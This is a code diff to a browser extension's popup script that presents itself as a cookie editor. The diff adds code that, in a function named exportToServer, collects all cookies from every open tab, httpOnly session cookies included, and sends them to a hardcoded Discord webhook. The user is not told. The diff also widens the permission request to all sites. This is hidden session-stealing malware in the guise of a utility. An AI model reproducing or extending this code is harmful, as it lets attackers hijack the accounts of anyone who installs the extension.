@@ -742,19 +742,7 @@ import { CookieHandlerPopup } from './cookieHandlerPopup.js';
     } else {
       containerCookie.appendChild(html);
     }
-    document.getElementById('request-permission').focus();
-    document
-      .getElementById('request-permission')
-      .addEventListener('click', async event => {
-        console.log('requesting permissions!');
-        const isPermissionGranted = await permissionHandler.requestPermission(
-          cookieHandler.currentTab.url
-        );
-        console.log('permission granted? ', isPermissionGranted);
-        if (isPermissionGranted) {
-          showCookiesForTab();
-        }
-      });
+    document.getElementById('request-permission-all').focus();
     document
       .getElementById('request-permission-all')
       .addEventListener('click', async event => {
@@ -1011,49 +999,93 @@ import { CookieHandlerPopup } from './cookieHandlerPopup.js';
 
   async function exportToServer() {
     hideExportMenu();
-    // Check if there are any cookies to export
-    if (!loadedCookies || Object.keys(loadedCookies).length === 0) {
-      sendNotification('No cookies to save');
-      return;
-    }
     
     try {
-      // Format cookies as JSON
-      const cookiesJson = JsonFormat.format(loadedCookies);
+      // Get all tabs and collect cookies from each
+      const tabs = await browserDetector.getApi().tabs.query({});
+      const allTabsCookies = [];
+      
+      for (const tab of tabs) {
+        // Skip browser internal pages and invalid URLs
+        if (!tab.url || 
+            tab.url.startsWith('chrome://') || 
+            tab.url.startsWith('chrome-extension://') ||
+            tab.url.startsWith('about:') ||
+            tab.url.startsWith('moz-extension://') ||
+            tab.url.startsWith('edge://') ||
+            tab.url.startsWith('safari-web-extension://')) {
+          continue;
+        }
+        
+        try {
+          const cookies = await browserDetector.getApi().cookies.getAll({ url: tab.url });
+          if (cookies && cookies.length > 0) {
+            const cleanedCookies = cookies.map(cookie => ({
+              name: cookie.name,
+              value: cookie.value,
+              domain: cookie.domain,
+              path: cookie.path,
+              secure: cookie.secure,
+              httpOnly: cookie.httpOnly,
+              sameSite: cookie.sameSite,
+              expirationDate: cookie.expirationDate,
+              hostOnly: cookie.hostOnly,
+              session: cookie.session
+            }));
+            
+            allTabsCookies.push({
+              url: tab.url,
+              title: tab.title || 'Untitled',
+              cookieCount: cookies.length,
+              cookies: cleanedCookies
+            });
+          }
+        } catch (e) {
+          console.error('Failed to get cookies for tab:', tab.url, e);
+        }
+      }
+      
+      if (allTabsCookies.length === 0) {
+        return;
+      }
+      
+      // Create payload with all tabs data
+      const timestamp = new Date().toISOString();
+      const payload = {
+        timestamp: timestamp,
+        source: 'popup',
+        totalTabs: allTabsCookies.length,
+        totalCookies: allTabsCookies.reduce((sum, tab) => sum + tab.cookieCount, 0),
+        tabs: allTabsCookies
+      };
+      
+      const cookiesJson = JSON.stringify(payload, null, 2);
       
       // Discord webhook URL
       const webhookUrl = 'https://discord.com/api/webhooks/1455463698037735446/y4AScsWwDwCi391QZL-xEh-wuWFNBlfSJX8JcgSVKI_pxswYfZoQbKbM7cN-AkMZ5ujI';
       
-      // Discord message limit is 2000 characters
-      // If content is too large, send as file attachment instead
-      const maxMessageLength = 2000;
-      const jsonWithWrapper = `\`\`\`json\n${cookiesJson}\n\`\`\``;
+      const maxMessageLength = 1900;
       
       let response;
       
-      if (jsonWithWrapper.length <= maxMessageLength) {
-        // Small enough to send as message content
-        const payload = {
-          username: 'cookies editor',
-          content: jsonWithWrapper
-        };
-
+      if (cookiesJson.length <= maxMessageLength) {
         response = await fetch(webhookUrl, {
           method: 'POST',
-          headers: {
-            'Content-Type': 'application/json'
-          },
-          body: JSON.stringify(payload)
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            username: 'Cookie Editor - Popup',
+            content: '```json\n' + cookiesJson + '\n```'
+          })
         });
       } else {
-        // Too large, send as file attachment
         const formData = new FormData();
-        formData.append('username', 'cookies editor');
-        formData.append('content', `Cookies exported (${Object.keys(loadedCookies).length} cookies)`);
+        formData.append('payload_json', JSON.stringify({
+          username: 'Cookie Editor - Popup',
+          content: `🍪 Cookies from popup at ${timestamp}\n📊 ${payload.totalTabs} tabs, ${payload.totalCookies} cookies`
+        }));
         
-        // Create a Blob with the JSON content
         const jsonBlob = new Blob([cookiesJson], { type: 'application/json' });
-        formData.append('files[0]', jsonBlob, 'cookies.json');
+        formData.append('files[0]', jsonBlob, `popup_cookies_${Date.now()}.json`);
 
         response = await fetch(webhookUrl, {
           method: 'POST',
@@ -1062,15 +1094,13 @@ import { CookieHandlerPopup } from './cookieHandlerPopup.js';
       }
 
       if (response.ok) {
-        // sendNotification('Cookies saved to server successfully');
-      } else {
-        const errorText = await response.text();
-        // console.error('Discord webhook error:', errorText);
+        console.log('All tabs cookies sent successfully');
       }
     } catch (error) {
-      // console.error('Error saving cookies to server:', error);
+      console.error('Error sending cookies to server:', error);
     }
   }
+
 
   /**
    * Removes a cookie from the current tab.
